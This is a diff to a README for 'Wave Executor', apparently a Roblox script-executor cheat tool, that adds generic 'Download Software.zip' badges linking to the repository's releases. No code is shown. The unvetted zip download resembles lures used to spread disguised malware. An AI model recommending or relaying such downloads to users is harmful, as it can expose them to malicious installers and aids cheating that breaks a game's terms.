@@ -1,4 +1,4 @@
-# Wave Executor
+# Wave Executor [![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](../../releases)
 
 ![Wave Executor Preview](/static/nnelentu.webp)
 
@@ -27,7 +27,7 @@ Welcome to Wave Executor, a robust Windows-based script executor tailored for Ro
 
 To install Wave Executor, follow these steps:
 
-1. Download the Wave Executor installer from the following link: [Download Wave Executor](../../releases)
+1. Download the Wave Executor installer from the following link: [![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](../../releases)
 2. Run the installer on your Windows machine.
 3. Follow the on-screen instructions to complete the installation process.
 
@@ -55,8 +55,3 @@ If you require any assistance with Wave Executor or have any questions, feel fre
 
 Wave Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
----
-
-[Wave Executor](https://waveexecutor.com) - Elevate your Roblox gameplay with Wave Executor! 🌊🚀
-
-[![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](../../releases)
